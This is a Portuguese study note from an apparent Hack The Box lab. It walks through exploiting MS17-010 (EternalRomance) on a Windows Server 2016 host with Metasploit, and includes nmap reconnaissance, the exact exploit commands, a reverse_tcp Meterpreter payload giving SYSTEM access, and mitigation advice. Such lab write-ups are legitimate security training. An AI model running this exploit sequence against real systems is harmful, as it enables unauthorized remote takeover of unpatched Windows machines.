# MS17-010 (EternalRomance) com Metasploit — Nota de Estudo

> Laboratório de estudo em ambiente **autorizado** (Hack The Box, via Pwnbox).
> Alvo efêmero e descartável. Flag omitida de propósito — este material é sobre
> o **processo**, não sobre a resposta.

## Resumo

| Item | Valor |
|---|---|
| Alvo | Host Windows em rede isolada de lab |
| SO | Windows Server 2016 Standard (build 14393) |
| Vulnerabilidade | MS17-010 (`CVE-2017-0143`) — SMBv1 |
| Exploit usado | EternalRomance (`exploit/windows/smb/ms17_010_psexec`) |
| Payload | `windows/meterpreter/reverse_tcp` |
| Resultado | Sessão Meterpreter como `NT AUTHORITY\SYSTEM` |
| Ferramentas | `nmap`, Metasploit Framework |

## 1. Reconhecimento

Varredura inicial de portas para mapear a superfície de ataque:

```bash
nmap <alvo>
```

```
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

A porta **445/tcp (microsoft-ds)** indica SMB em um host Windows — superfície
clássica para a família de falhas MS17-010.

## 2. Verificação da vulnerabilidade

Antes de explorar, confirmar a hipótese com o script NSE dedicado:

```bash
nmap -p445 --script smb-vuln-ms17-010 <alvo>
```

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

Ponto conceitual: o NSE confirma a **vulnerabilidade** (MS17-010). "EternalBlue"
e "EternalRomance" não são falhas distintas — são **exploits diferentes do mesmo
bug**. Qual deles usar é decisão tática, não de detecção.

## 3. Exploração (Metasploit)

```
msf6 > search ms17_010
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS <alvo>
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

Notas de configuração:

- **`RHOSTS`** = alvo (remoto) · **`LHOST`** = atacante (local). Precisam ser
  endereços **diferentes**.
- Em ambiente de lab com VPN, o `LHOST` tem que ser a interface do túnel
  (`tun0`), e não o IP público da máquina — senão o shell reverso não tem rota
  de volta. O Metasploit aceita o nome da interface diretamente.

Saída relevante:

```
[+] 10.x.x.x:445 - Overwrite complete... SYSTEM session obtained!
[*] Meterpreter session 1 opened (...)
(Meterpreter 1)(C:\Windows\system32) >
```

Acesso obtido como **SYSTEM** — a conta de maior privilégio do Windows.

## 4. Pós-exploração

```
meterpreter > search -f flag.txt
meterpreter > cd C:/Users/Administrator/Desktop
meterpreter > ls
meterpreter > cat flag.txt
```

```
Flag: HTB{████████████████████}   # omitida de propósito
```

Observação: os comandos do Meterpreter (`pwd`, `ls`, `cd`, `cat`) são built-ins
que funcionam igual em qualquer SO — o agente abstrai o Windows por baixo.

## 5. Mitigação

- Aplicar o patch **MS17-010** (já disponível desde 2017).
- **Desabilitar o SMBv1** — protocolo legado, sem motivo para estar ativo.
- Segmentar a rede e bloquear SMB (445/139) no perímetro.
- Monitorar escritas em compartilhamentos administrativos (`ADMIN$`).

## 6. Lições aprendidas

- **Confirmar antes de disparar**: recon → validação → exploração.
- **Contexto do shell importa**: `find`/`grep` são do Linux (atacante);
  dentro do alvo Windows, o equivalente é o `search` do Meterpreter.
- **`RHOSTS` ≠ `LHOST`**: trocar os dois é o erro de iniciante mais comum.
- **`LHOST` em VPN = interface do túnel**, não o IP público.

## Referências

- CVE-2017-0143 — <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143>
- MS17-010 — <https://learn.microsoft.com/security-updates/securitybulletins/2017/ms17-010>
